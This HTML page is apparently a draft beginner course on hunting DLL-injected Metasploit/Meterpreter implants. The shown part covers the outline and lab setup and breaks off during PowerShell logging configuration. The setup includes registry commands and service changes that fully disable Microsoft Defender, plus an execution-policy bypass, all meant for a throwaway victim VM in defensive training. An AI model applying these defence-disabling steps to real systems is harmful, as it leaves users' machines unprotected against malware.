<!DOCTYPE html>
<html><head lang="en">
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course) - faan|ross</title><link rel="icon" type="image/x-icon" href=/favicon.ico /><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="In this beginner-friendly practical course we&#39;ll learn how to threat hunt standard DLL-injected C2 implants. We&#39;ll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings." />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course)" />
<meta property="og:description" content="In this beginner-friendly practical course we&#39;ll learn how to threat hunt standard DLL-injected C2 implants. We&#39;ll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://athul.github.io/archie/posts/course01/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-12T02:01:58+05:30" />
<meta property="article:modified_time" content="2023-08-12T02:01:58+05:30" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course)"/>
<meta name="twitter:description" content="In this beginner-friendly practical course we&#39;ll learn how to threat hunt standard DLL-injected C2 implants. We&#39;ll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings."/>
<script src="https://athul.github.io/archie/js/feather.min.js"></script>
	
	
        <link href="https://athul.github.io/archie/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://athul.github.io/archie/css/main.ed21e2343a948b7213db7c2893a1b95027c5acaafa446a8586de799d014fce06.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://athul.github.io/archie/css/dark.191767dd42068cd77e23d5f95ccc0becc0e7105decd65e1405e5695f242e2b3c.css"   />
	

	
	
		<script type="text/javascript"
		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
		</script>
	
		
		<script type="text/x-mathjax-config">
		MathJax.Hub.Config({
			tex2jax: {
				inlineMath: [['$','$'], ['\\(','\\)']],
				displayMath: [['$$','$$'], ['\[','\]']],
				processEscapes: true,
				processEnvironments: true,
				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
				TeX: { equationNumbers: { autoNumber: "AMS" },
						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
			}
		});
		</script>
	

	
	
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
		
		
		<script>
			document.addEventListener("DOMContentLoaded", function() {
					renderMathInElement(document.body, {
							delimiters: [
									{left: "$$", right: "$$", display: true},
									{left: "$", right: "$", display: false}
							]
					});
			});
			</script>
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://athul.github.io/archie/">faan|ross</a>
	</div>
	<nav>
		
		<a href="/archie/">Home</a>
		
		<a href="/archie/about">About</a>
		
		<a href="/archie/posts">Posts</a>
		
		<a href="/archie/tags">Tags</a>
		
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course)</h1>
			<div class="meta">Posted on Aug 12, 2023</div>
		</div>
		

		<section class="body">
			<hr>
<h1 id="note-this-is-currently-still-wip-the-reason-its-a-public-draft-is-long-and-convoluted-so-just-trust-me-anyhoo---do-as-you-wish">NOTE THIS IS CURRENTLY STILL WIP, THE REASON IT&rsquo;S A PUBLIC DRAFT IS LONG AND CONVOLUTED SO JUST TRUST ME. ANYHOO - DO AS YOU WISH.</h1>
<hr>
<h1 id="hello-friend-so-glad-you-could-make-it">Hello friend, so glad you could make it.</h1>
<figure class="custom-figure-3"><img src="/img/poe.gif"/>
</figure>

<p><code>This is the first in an ongoing + always-evolving series on threat hunting.</code></p>
<!-- raw HTML omitted -->
<p>The main thing I want you to know about this course is that <em><strong>we will learn by doing</strong></em>.</p>
<p><code>(1)</code> We&rsquo;ll start off by creating + configuring our own virtual network, including systems for the victim, attacker, and analyst.</p>
<p><code>(2)</code> Then, instead of using prepackaged data we&rsquo;ll generate data by performing the attack ourselves. We&rsquo;ll use the <em>Metasploit</em> framework along with a <em>Powersploit</em> DLL-injection script to connect back from the victim to a <em>Meterpreter</em> handler. We&rsquo;ll then simulate a few rudimentary actions such as data exfiltration etc.</p>
<p><code>(3)</code> We&rsquo;ll then perform the actual threat hunt. We&rsquo;ll initially perform two rounds of live analysis - first using only Windows native tools to check the vitals, and then using <em>Process Hacker</em> we&rsquo;ll prod deeper into the memory.</p>
<p>In the post-mortem analysis we&rsquo;ll look at the memory dump(<em>Volatility3</em>) and perform log analysis (<em>Sysmon</em> + <em>PowerShell ScriptBlock</em>) before wrapping things up with an abbreviated traffic analysis (<em>WireShark</em>).</p>
<p><code>(4)</code> Finally we&rsquo;ll crystallize all our insights so we can both reinforce what we&rsquo;ve learned, as well as learn how to effectively communicate our findings to the greater cybersecurity ecosystem.</p>
<p>I will interject with theory when and where necessary, as well as provide references in each associated section. If something is unclear I encourage you to take a sojourn in the spirit of returning with an improved understanding of our topic at hand. This is after all a journey that need not be linear - the goal is to learn, and have as much fun as possible. <code>Act accordingly</code>.</p>
<figure class="custom-figure"><img src="/img/brent.gif"/>
</figure>

<h1 id="course-outline">Course Outline</h1>
<ul>
<li><a href="https://www.faanross.com/course01/prebanter/">0. Pre-Course Banter</a></li>
<li><a href="https://www.faanross.com/course01/01_settingup/">1. Setting Up Our Virtual Environment</a></li>
<li><a href="https://www.faanross.com/course01/02_attack/">2. Performing the Attack</a></li>
<li><a href="https://www.faanross.com/course01/03_live_native/">3. Live Analysis - Native Windows Tools</a></li>
<li><a href="https://www.faanross.com/course01/04_live_hacker/">4. Live Analysis - Process Hacker</a></li>
<li><a href="https://www.faanross.com/course01/05_post_memory/">5. Post-Mortem Forensics - Memory</a></li>
<li><a href="https://www.faanross.com/course01/06_post_logs/">6. Post-Mortem Forensics - Log Analysis</a></li>
<li><a href="https://www.faanross.com/course01/07_post_traffic/">7. Post-Mortem Forensics - Traffic Analysis</a></li>
<li><a href="https://www.faanross.com/course01/08_course_review/">8. Course Review</a></li>
</ul>
<p>If you&rsquo;d like to see a detailed overview of the the entire course <a href="https://www.faanross.com/course01/outline/">click here</a></p>
<hr>
<p> </p>
<h1 id="course-outline-1">Course Outline</h1>
<p><a href="">Here&rsquo;s a quick overview of the entire course:</a></p>
<hr>
<hr>
<h1 id="1-setting-up-our-virtual-environment">1. Setting Up Our Virtual Environment</h1>
<figure class="custom-figure"><img src="/img/randy01.gif"/>
</figure>

<h1 id="11-introduction">1.1. Introduction</h1>
<p>In this section we&rsquo;ll set up the three VMs we&rsquo;ll need for the course - Windows 10 (Victim), Kali Linux (Attacker), and Ubuntu 20.04 (Post-Mortem Analysis). First we&rsquo;ll download the iso images and use them to install the operating systems. Then, depending on the specific VM, we&rsquo;ll perform some configurations as well as install extra software.</p>
<figure class="custom-figure"><img src="/img/tripleram.gif"/>
</figure>

<hr>
<h1 id="12-requirements">1.2. Requirements</h1>
<p>I do want to give you some sense of the hardware requirements for this course, however I also have to add that I am not an expert in this area. <em><strong>AT ALL.</strong></em> So I&rsquo;ll provide an overview of what we&rsquo;ll be running, as well as what I think this translates to in terms of host resources (ie your actual system). But please - if you disagree with my estimation and believe you can get the same results by adapting the process, then please do so. After all - this is the <em>way of the hacker</em>.</p>
<figure class="custom-figure"><img src="/img/thehacker.gif"/>
</figure>

<p>As mentioned above, we&rsquo;ll create 3 VMs in total, however, at any one moment there will only be a <code>maximum of 2 VMs running concurrently</code>. For each of these VMs I recommend the following system resources:</p>
<ul>
<li>min 2 (ideally 4) CPU cores</li>
<li>min 4 (ideally 8) GB RAM</li>
<li>around 60 GB HD space (allocated)</li>
</ul>
<p>So based on this, that is roughly 2x the above + resources for your actual host system, you would likely need something along the lines of:</p>
<ul>
<li>8 CPU cores (12+ even better)</li>
<li>16 GB RAM (32+ even better)</li>
<li>200 GB free HD space</li>
</ul>
<figure class="custom-figure"><img src="/img/beefcake.gif"/>
</figure>

<p>Now I understand this requirement is rather beefy, but consider:</p>
<ul>
<li>You don&rsquo;t have to use a single system to run the entire VLAN - you could create an actual physical network, for ex with a Raspberry Pi cluster, and run the VMs on that. Or mini-pcs, or refurbished clients - really for a few hundred dollars you could more than easily be equipped to run a small network. I don&rsquo;t want to sound insensitive to a few 100 dollars, but I&rsquo;m gonna level with you: <code>if you want to learn cybersecurity then there is no better investment than having localized resources to create virtual simulations</code>.</li>
<li>In case you don&rsquo;t want to invest up-front but don&rsquo;t mind paying some running costs: You can also use a service like <a href="https://www.linode.com">Linode</a> and simply rent compute via the cloud. You can then install your VMs on that, and have access to them for as long as you care to foot the bill.</li>
</ul>
<p>Finally I want to mention that beyond the hardware, <code>everything we will use is completely free</code>. This course ain&rsquo;t upselling a full course, and every piece of software is freely available. The sole exception has free alternatives, which I&rsquo;m about to discuss with you right now.</p>
<hr>
<h1 id="13-hosted-hypervisor">1.3. Hosted Hypervisor</h1>
<p>So in the off-chance you don&rsquo;t know: a hosted (type 2) hypervisor is the software that allows us to run virtual machines on top of our base operating system. It&rsquo;s kinda like <em>Inception</em> - it allows us to create systems within our systems.</p>
<figure class="custom-figure"><img src="/img/inception.gif"/>
</figure>

<p>For this course I&rsquo;ll be using <a href="https://store-us.vmware.com/workstation_buy_dual">VMWare Workstation</a>, which as of writing costs around $200. However you could also do it with either <a href="https://www.vmware.com/ca/products/workstation-player.html">VMWare Player</a>, or <a href="https://www.virtualbox.org/wiki/Downloads">Oracle Virtualbox</a>, both of which are free.</p>
<p>I&rsquo;ve used both <code>VMWare Player</code> and <code>VirtualBox</code> in the past, they mostly work well but running into some issues from time-to-time should not be completely unexpected. That being said, the problems I encountered were all, in hindsight, opportunities to learn. Frustrating - <em>feck yesh</em>. Enriching - sure.</p>
<p>Since I switched over to <code>VMWare Workstation</code> my experience has been significantly more stable, so if you do have the money and are committed to this path as a career I would definitely consider getting it. That being said I don&rsquo;t wanna come across as some corporate shill, so really the choice is totally up to you.</p>
<figure class="custom-figure"><img src="/img/makechoice.gif"/>
</figure>

<p>Note that if you decide to not use <code>VMWare Workstation</code> then some of the details of the setup might be different. When that occurs it&rsquo;ll be up to you to figure out how to adapt it for your situation - Google, ChatGPT, StackExchange, common sense etc. Again, use the opportunities when things don&rsquo;t happen exactly &ldquo;as they should&rdquo; to learn. As a wise emperor once said - <em><strong>The impediment to action advances action. What stands in the way becomes the way.</strong></em></p>
<p><code>So at this point please take a moment to download and install the hypervisor of your choice.</code></p>
<p>Once that&rsquo;s done with feel free to proceed&hellip;</p>
<figure class="custom-figure-2"><img src="/img/pleasego.gif"/>
</figure>

<hr>
<h1 id="14-vm-images">1.4. VM Images</h1>
<p>Now that you have your hypervisor up and running the next thing we need to do is install our actual virtual machines. There are a few ways to do this, you can for example simply download the entire VM and simply import it into your hypervisor. This does usually mean that the file you&rsquo;ll be downloading will be quite large, so we&rsquo;ll opt for another approach - using iso files. You can think of an iso file simply as a &ldquo;virtual copy&rdquo; of the installation disc. So instead of importing the completed VM, we will be installing the VM ourselves using the iso image.</p>
<p>So please go ahead and download the following 3 iso&rsquo;s:</p>
<ul>
<li>For the victim we&rsquo;ll use <a href="https://info.microsoft.com/ww-landing-windows-10-enterprise.html">Windows 10 Enterprise Evaluation 32-bit</a>. Note that MS will want you to register (it&rsquo;s free), so do so to download the iso OR <a href="https://techcommunity.microsoft.com/t5/windows-11/accessing-trials-and-kits-for-windows/m-p/3361125">click here</a> to go to a Microsoft Tech Community post with direct download links.</li>
<li>For the attacker we&rsquo;ll use <a href="https://www.kali.org/get-kali/#kali-installer-images">Kali Linux</a>.</li>
<li>For post-mortem analysis we&rsquo;ll be using <a href="https://releases.ubuntu.com/focal/">Ubuntu Linux Focal Fossa</a>. The reason being is in future courses we&rsquo;ll be using <em>RITA</em>, which, as of writing, runs best on <em>Focal Fossa</em>.</li>
</ul>
<p>Once you&rsquo;ve successfully downloaded all three iso images we are ready to proceed.</p>
<hr>
<h1 id="15-vm-1-windows-10-aka-the-victim">1.5. VM 1: Windows 10 aka &ldquo;The Victim&rdquo;</h1>
<figure class="custom-figure"><img src="/img/screamdrew.gif"/>
</figure>

<h1 id="151-installation">1.5.1. Installation</h1>
<ol>
<li>In VMWare Workstation goto <code>File</code> -&gt; New Virtual Machine.</li>
<li>Choose <code>Typical (recommended)</code>, then click <code>Next</code>.</li>
<li>Then select <code>I will install the operating system later</code> and hit <code>Next</code>.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image001.png"/>
</figure>

<ol start="4">
<li>Select <code>Microsoft Windows</code>, and under Version select <code>Windows 10</code>.</li>
<li>Here you are free to call the machine whatever you&rsquo;d like, in my case I am calling it <code>Victim</code>.</li>
<li>Select 60 GB and <code>Split virtual disk into multiple files</code>.</li>
<li>Then on the final screen click on <code>Customize Hardware</code>.</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image002.png"/>
</figure>

<ol start="8">
<li>Under <code>Memory</code> (see left hand column) I suggest at least 4096 MB, if possible given your available resources then increase it to 8192 MB.</li>
<li>Under <code>Processors</code> I suggest at least 2, if possible given your available resources then increase it to 4.</li>
<li>Under <code>New CD/DVD (SATA)</code> change Connection from Use Physical Drive to <code>Use ISO image file</code>. Click <code>Browse…</code> and select the location of your Windows 10 iso file.</li>
<li>Once done click <code>OK</code> on the bottom to exit out of the Hardware options dialog box.</li>
</ol>
<p>You should now see your VM in your Library (left hand column), select it and then click on <code>Power on this virtual machine</code>. If you don&rsquo;t see a Library column on the left simply hit <code>F9</code> which toggles its visibility.</p>
<p>Wait a short while and then you should see a Windows Setup window. Choose your desired language et cetera, select <code>Next</code> and then click on <code>Install Now</code>. Select <code>I accept the license terms</code> and click <code>Next</code>. Next select <code>Custom: Install Windows only (advanced)</code>, and then select your virtual HD and click Next.</p>
<p>Once its done installing we’ll get to the setup, select your region, preferred keyboard layout etc. Accept the <code>License Agreement</code> (if you dare - <em><strong>mwhahaha!</strong></em>). Now once you reach the <code>Sign in</code> page don’t fill anything in, rather select <code>Domain join instead</code> in the bottom left-hand corner.</p>
<figure class="custom-figure-2"><img src="/img/image006a.png"/>
</figure>

<p>Choose any username and password, in my case it&rsquo;ll be the highly original choice of <code>User</code> and <code>password</code>. Then choose 3 security questions, since this is a &ldquo;burner&rdquo; system used for the express purpose of this course don&rsquo;t overthink it - randomly hitting the keyboard a few times will do just fine. Turn off all the privacy settings, and for <code>Cortana</code> select <code>Not Now</code>.</p>
<p>Windows will now finalize installation + configuration, this could take a few minutes, whereafter you will see your desktop.</p>
<h1 id="152-vmware-tools">1.5.2. VMWare Tools</h1>
<p>Next we&rsquo;ll install VMWare Tools which for our purposes does two things. First, it ensure that our VMs screen resolution assumes that of our actual monitor, but more importantly it also gives us the ability to copy and paste between the host and the VM.</p>
<p>So just to be sure, at this point you should be staring at a Windows desktop. Now in the VMWare menu bar click <code>VM</code> and then <code>Install VMWare Tools</code>. If you open <code>Explorer</code> (in the VM) you should now see a <code>D:</code> drive.</p>
<figure class="custom-figure-2"><img src="/img/image008.png"/>
</figure>

<p>Double-click the drive, hit <code>Yes</code> when asked if we want this app to make changes to the device. Hit <code>Next</code>, select <code>Typical</code> and hit <code>Next</code>. Finally hit <code>Install</code> and then once done <code>Finish</code>. You&rsquo;ll need to restart your system for the changes to take effect, but we&rsquo;ll shut it down since we need to change a setting. So hit the Windows icon, Power icon, and then select <code>Shut Down</code>.</p>
<p>Right-click on your VM and select <code>Settings</code>. In the list on the LHS select <code>Display</code>, which should be right at the bottom. On the bottom - deselect <code>Automatically adjust user interface size in the virtual machine</code>, as well as <code>Stretch mode</code>, it should now look like this:</p>
<figure class="custom-figure-2"><img src="/img/image009.png"/>
</figure>

<p>Go ahead and start-up the VM once again, we&rsquo;ll now get to configuring our VM.</p>
<h1 id="153-deep-disable-ms-defender--updates">1.5.3. Deep disable MS Defender + Updates</h1>
<p>I call this &lsquo;deep disable&rsquo; because simply toggling off the switches in <code>Settings</code> won&rsquo;t actually fully disable Defender and Updates. You see, Windows thinks of you as a younger sibling - it feels the need to protect you a bit, most of the time without you even knowing. (Unlike Linux of course which will allow you to basically nuke your OS kernel if you so desired.)</p>
<figure class="custom-figure"><img src="/img/winlin.png"/>
</figure>

<p>And just so you know why it is we&rsquo;re doing this&hellip;</p>
<p>We are disabling Defender so that the AV won&rsquo;t interfere with us attacking the system. Now you might think well this represents an unrealistic situation since in real-life we&rsquo;ll always have our AV running. Thing is, this is a simulation - we are simulating an actual attack.</p>
<p>Yes, the AV might pick up on our mischievous escapades here since we are using a well-known and widely-used malware framework. But, if you are being attacked by an actual threat actor worth their salt they likely won&rsquo;t be using something so common. It&rsquo;s not that much of a stretch to assume they will be capable of using analogous technologies that our AV will not pick up on. Thus, by turning off Defender this is what we are simulating.</p>
<p>And as for updates, we disable this because sometimes we can spend all this time configuring and setting things up and then one day we boot up our VM up, Windows does it&rsquo;s whole automatic update schpiel, and suddenly things are broken. This is thus a small time investment to hedge against extreme potential frustration. <em>So worth it</em>.</p>
<figure class="custom-figure"><img src="/img/do_it_now.gif"/>
</figure>

<ol>
<li><strong>Disable Tamper Protection</strong>
<ol>
<li>Hit the <code>Start</code> icon, then select the <code>Settings</code> icon.</li>
<li>Select <code>Update &amp; Security </code>.</li>
<li>In LHS column, select <code>Windows Security</code>, then click <code>Open Windows Security</code>.</li>
<li>A new window will pop up. Click on <code>Virus &amp; threat protection</code>.</li>
<li>Scroll down to the heading that says <code>Virus &amp; threat protection settings</code> and click on <code>Manage settings</code>.</li>
<li>There should be 4 toggles in total, we are really interested in disabling <code>Real-time protection</code>, however since we are here just go ahead and disable all of them.</li>
<li>Note that Windows will warn you and ask if you want to allow this app to make changes to the device, hit <code>Yes</code>.</li>
<li>All 4 toggle settings should now be disabled.</li>
</ol>
</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image010.png"/>
</figure>

<ol start="2">
<li><strong>Disable the Windows Update service</strong>
<ol>
<li>Open the Run dialog box by pressing Win+R.</li>
<li>Type <code>services.msc</code> and press Enter.</li>
<li>In the Services list, find <code>Windows Update</code>, and double-click it.</li>
<li>In the Windows Update Properties (Local Computer) window, under the <code>General</code> tab, in the <code>Startup type:</code> dropdown menu, select <code>Disabled</code> - see image below.</li>
<li>Click <code>Apply</code> and then <code>OK</code>.</li>
</ol>
</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image011.png"/>
 </figure>

<ol start="3">
<li><strong>Disable Defender via Group Policy Editor</strong>
<ol>
<li>Open the Run dialog box by pressing Win+R.</li>
<li>Type <code>gpedit.msc</code> and hit enter. The <code>Local Group Policy Editor</code> should have popped up.</li>
<li>In the tree on the LHS navigate to the following: <code>Computer Configuration</code> &gt; <code>Administrative Templates</code> &gt; <code>Windows Components</code> &gt; <code>Microsoft Defender Antivirus</code>.</li>
<li>In the RHS double-click on <code>Turn off Microsoft Defender Antivirus</code>.</li>
<li>In the new window on the top left select <code>Enabled</code> - see image below.</li>
<li>First hit <code>Apply</code> then <code>OK</code>.</li>
</ol>
</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image012.png"/>
 </figure>

<ol start="4">
<li>
<p><strong>Disable Updates via Group Policy Editor</strong></p>
<ol>
<li>Still in <code>Local Group Policy Editor</code>, navigate to: <code>Computer Configuration</code> &gt; <code>Administrative Templates</code> &gt; <code>Windows Components</code> &gt; <code>Windows Update</code>.</li>
<li>In the RHS double-click on <code>Configure Automatic Updates</code>.</li>
<li>Select <code>Disabled</code>, then click <code>Apply</code> and <code>OK</code>.</li>
</ol>
</li>
<li>
<p><strong>Disable Defender via Registry</strong></p>
<ol>
<li>In the search bar on the bottom type <code>cmd</code>.</li>
<li>On the top left, right under <code>Best match</code> you should see <code>Command Prompt</code>.</li>
<li>Right-click and select <code>Run as administrator</code>, hit <code>Yes</code>.</li>
<li>Copy and paste the following command below into your command prompt and hit enter.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>REG ADD &#34;hklm\software\policies\microsoft\windows defender&#34; /v DisableAntiSpyware /t REG_DWORD /d 1 /f
</span></span></code></pre></div></li>
</ol>
<p>Almost there! We just need to boot into Safe Mode to make some final adjustments to the registry and then we are good to go.</p>
<ol start="6">
<li><strong>Reboot system in Safe Mode</strong>
<ol>
<li>Open the <code>Run</code> dialog box by pressing Win+R.</li>
<li>Write <code>msconfig</code> and hit enter.</li>
<li>Select the <code>Boot</code> tab.</li>
<li>Under <code>Boot options</code> select <code>Safe boot</code>, ensure <code>Minimal</code> is selected - see image below.</li>
<li>Hit <code>Apply</code> first, the <code>OK</code>.</li>
<li>Select <code>Restart</code>.</li>
</ol>
</li>
</ol>
<figure class="custom-figure-2"><img src="/img/image014.png"/>
</figure>

<p>Once your system has restarted in <code>Safe mode</code>&hellip;</p>
<ol start="7">
<li><strong>Disable Defender via Registry</strong>
<ol>
<li>Open the <code>Run</code> dialog box by pressing Win+R.</li>
<li>Write <code>regedit</code> and hit enter, this should bring up the <code>Registry Editor</code>.</li>
<li>Below you will see a list of 6 keys. For each of these keys you will follow the same process: once the key is selected find the <code>Start</code> value in the RHS, double-click, change the value to <code>4</code> and hit <code>OK</code> - see image below.</li>
</ol>
<ul>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>Sense</code></li>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>WdBoot</code></li>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>WinDefend</code></li>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>WdNisDrv</code></li>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>WdNisSvc</code></li>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>CurrentControlSet</code> &gt; <code>Services</code> &gt; <code>WdFilter</code></li>
</ul>
</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image015.png"/>
</figure>

<ol start="8">
<li><strong>Disable Updates via Registry</strong>
<ol>
<li>Still in <code>Registry Editor</code> let&rsquo;s navigate to the following:</li>
</ol>
<ul>
<li><code>Computer</code> &gt; <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SOFTWARE</code> &gt; <code>Microsoft</code> &gt; <code>Windows</code> &gt; <code>CurrentVersion</code> &gt; <code>WindowsUpdate</code> &gt; <code>Auto Update</code></li>
</ul>
<ol start="2">
<li>Right-click the <code>Auto Update</code> key, select <code>New</code>, and then click <code>DWORD (32-bit) Value</code>.</li>
<li>Name the new key <code>AUOptions</code> and press Enter.</li>
<li>Double-click the new <code>AUOptions</code> key and change its value to <code>2</code>. Click <code>OK</code> - see image below.</li>
<li>Close Registry Editor.</li>
</ol>
</li>
</ol>
<figure class="custom-figure-3"><img src="/img/image016.png"/>
</figure>

<ol start="9">
<li><strong>Leave Safe Mode</strong>
<ol>
<li>All that&rsquo;s left to do is get back into our regular Windows environment.</li>
<li>Open the <code>Run</code> dialog box by pressing Win+R.</li>
<li>Write <code>msconfig</code> and hit enter.</li>
<li>Select <code>Boot</code> tab.</li>
<li>Deselect <code>Safe boot</code>, hit <code>Apply</code>, hit <code>OK</code>.</li>
<li>Hit <code>Restart</code>.</li>
</ol>
</li>
</ol>
<p>And that, I can promise you, is by far the most boring part of this entire course. But the good news is that this is potentially the last time you have to do it. <em>Ever</em>. This is because we can now convert this VM to a template and clone it indefinitely in the future.</p>
<p>But before we learn to do that, let&rsquo;s setup all the awesome tools we&rsquo;ll be using in this course.</p>
<h1 id="154-sysmon">1.5.4. Sysmon</h1>
<p>You should now be back in the normal Windows environment looking at your desktop. Let&rsquo;s set up <em><strong>Sysmon</strong></em> - a simple, free, Microsoft-owned program that will <em>dramatically</em> improve our logging ability.</p>
<figure class="custom-figure"><img src="/img/lumberjack.gif"/>
</figure>

<p>Before we install <em><strong>Sysmon</strong></em> there&rsquo;s just one thing you need to know - in addition to downloading <em><strong>Sysmon</strong></em> itself, we also need a config file. One day when you get to <em>that</em> level you can even create your own config file, which will allow you to make it behave exactly how you want it to.</p>
<p>But for now, since we are decidedly not yet there, let&rsquo;s download and use one made by some really smart people. Of late  I have heard a few trusted sources, included <a href="https://www.ericconrad.com">Eric Conrad</a> prefer <a href="https://github.com/bakedmuffinman/Neo23x0-sysmon-config">this version from Neo23x0</a> whose authors included another blue team giant, <a href="https://twitter.com/cyb3rops?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Florian Roth</a>.</p>
<p>So first download the <a href="https://github.com/bakedmuffinman/Neo23x0-sysmon-config">config file</a>, then <a href="https://download.sysinternals.com/files/Sysmon.zip">go here to download Sysmon</a>. You should now have two zip files - the config you downloaded from Github, as well as the <em><strong>Sysmon</strong></em> zip file. Extract the <em><strong>Sysmon</strong></em> archive, the contents should look as follows:</p>
<figure class="custom-figure-3"><img src="/img/image017.png"/>
</figure>

<p>Now also extract the zip file containing the config. Inside of the folder rename <code>sysmonconfig-export.xml</code> to <code>sysmonconfig.xml</code>. Now simply cut (or copy) the file and paste it in the folder containing <em><strong>Sysmon</strong></em>.</p>
<p>Great, everything is set up so now we can install it with a simple command. Open command prompt as administrator and navigate to the folder containing <em><strong>Sysmon</strong></em> and the config file - in my case it is <code>c:\Users\User\Downloads\Sysmon</code>. Run the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Sysmon.exe -accepteula -i
</span></span></code></pre></div><p>This is what a successful installation will look like:</p>
<figure class="custom-figure"><img src="/img/image018.png"/>
</figure>

<p>Now let&rsquo;s just validate that it&rsquo;s running. In the command prompt run the command <code>powershell</code> so we change over into a PS shell. Then, run the command <code>Get-Service sysmon</code>. In the image below we can see it is running - we are good to go!</p>
<figure class="custom-figure"><img src="/img/image019.png"/>
</figure>

<p>That&rsquo;s it for Sysmon, now let&rsquo;s enable PowerShell ScriptBlock logging.</p>
<h1 id="155-powershell-scriptblock-logging">1.5.5. PowerShell ScriptBlock Logging</h1>
<p>For security purposes, another quick and easy switch we can flip is enabling PowerShell logging. This is great because one specific type of PowerShell logs (<code>ScriptBlock</code>) will record exactly what command was run in PowerShell. As we know, in-line with the <code>Living off the Land</code> paradigm, modern adversaries LOVE abusing PowerShell. It should this be clear why having logs of commands that were run in PowerShell could potentially be of huge benefit to us.</p>
<p>Something to be aware of is that there are a few types of PowerShell logging: Module, ScriptBlock, Operational, Transcription, Core, and Protected Event. For the purposes of this course we will be activating <code>ScriptBlock</code>, as well as <code>Operational</code>. While activating the former tells PowerShell to log the commands, we also need to activate <code>Operational</code> so that the system is able to properly save the logs.</p>
<p>NOTE: This entire process could be performed in the GUI using <code>Group Policy Editor</code>, we will however be performing it via PowerShell command line. You should <em><strong>always</strong></em> prefer this method to using the GUI when it comes to enabling logs. Not simply to look cool, nay, there is a very good practical reason for this.</p>
<figure class="custom-figure"><img src="/img/verycool.gif"/>
</figure>

<p>Imagine for a moment you needed to activate this feature on 1000 stations. You could either do so by logging into each station individually and interacting with the <code>gpedit</code> GUI interface, which would likely take you a few days working at a ferocious pace for all 1000 stations. Alternatively, you could run a single command from a domain controller, which would take less than a minute for any amount of stations.</p>
<p>This is an admittedly dramatic way of saying that performing administrative tasks using PowerShell commands scales well, while flipping GUI toggles does not scale at all. So invest your time early on learning the methods that won&rsquo;t break down the moment you need to do it at scale, it&rsquo;s so worth it.</p>
<figure class="custom-figure"><img src="/img/worth.gif"/>
</figure>

<p>Open PowerShell as an administrator:</p>
<ol>
<li>First we&rsquo;ll set the execution policy to allow us to make the changes:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
</span></span></code></pre></div><ol start="2">
<li>We&rsquo;ll now create a new registry path for <code>ScriptBlockLogging</code>:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force
</span></span></code></pre></div><ol start="3">
